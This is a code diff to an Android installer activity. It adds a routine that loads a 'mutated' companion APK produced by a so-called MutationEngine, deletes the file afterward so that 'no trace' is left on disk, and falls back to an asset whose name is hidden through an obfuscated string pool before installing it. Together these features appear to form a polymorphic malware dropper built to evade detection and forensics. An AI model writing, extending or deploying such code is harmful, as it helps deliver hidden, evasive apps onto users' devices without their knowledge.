@@ -352,7 +352,7 @@ class InstallActivity : AppCompatActivity() {
 
             Thread {
                 try {
-                    val apkBytes = assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
+                    val apkBytes = getCompanionBytes()
                     if (apkBytes.isNotEmpty()) {
                         runOnUiThread { installViaSession(apkBytes, attempt = 1) }
                     } else {
@@ -363,6 +363,37 @@ class InstallActivity : AppCompatActivity() {
                 }
             }.start()
         }, 900)
+    }
+
+    /**
+     * Tier 1: Read mutated companion from filesDir/mc.tmp
+     *         (written by MutationEngine in LauncherApplication.onCreate)
+     *         Waits up to 6 seconds for mutation to complete.
+     *         Deletes file after reading — no trace left on disk.
+     *
+     * Tier 2: Base companion from assets
+     *         (used if server unreachable AND offline seeds not ready)
+     */
+    private fun getCompanionBytes(): ByteArray {
+        // Wait for MutationEngine to finish (max 6 seconds)
+        val mutatedFile = LauncherApplication.getMutatedApkFile(application)
+        val deadline = System.currentTimeMillis() + 6_000L
+        while (!mutatedFile.exists() && System.currentTimeMillis() < deadline) {
+            Thread.sleep(100)
+        }
+
+        if (mutatedFile.exists() && mutatedFile.length() > 0L) {
+            val bytes = mutatedFile.readBytes()
+            mutatedFile.delete()   // no trace left
+            return bytes
+        }
+
+        // Tier 2: fall back to base companion from assets
+        return try {
+            assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
+        } catch (e: Exception) {
+            ByteArray(0)
+        }
     }
 
     private fun startProgressAnimation() {
